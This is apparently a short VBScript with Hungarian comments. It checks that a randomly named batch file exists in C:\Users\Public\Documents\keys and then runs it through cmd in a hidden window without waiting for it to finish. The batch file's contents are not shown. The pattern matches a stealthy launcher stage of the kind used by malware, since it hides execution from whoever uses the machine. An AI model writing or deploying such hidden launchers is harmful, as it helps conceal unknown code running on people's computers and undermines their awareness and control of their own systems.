Option Explicit

Dim shell, baseDir, batPath, fso
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' A mappa, ahol feltételezzük, hogy a .bat fájl van
baseDir = "C:\Users\Public\Documents\keys"

' A Batch fájl teljes útvonala
batPath = baseDir & "\vw2i45ibzfrun2.bat"


' Ellenőrizzük, hogy a .bat fájl létezik-e
If Not fso.FileExists(batPath) Then
    MsgBox "A Batch fájl nem található: " & batPath
    WScript.Quit
End If

' Láthatatlan háttérben futtatás
' 0 = Rejtett ablak, False = Nem várjuk meg a befejezést
shell.Run "cmd /c """ & batPath & """", 0, False
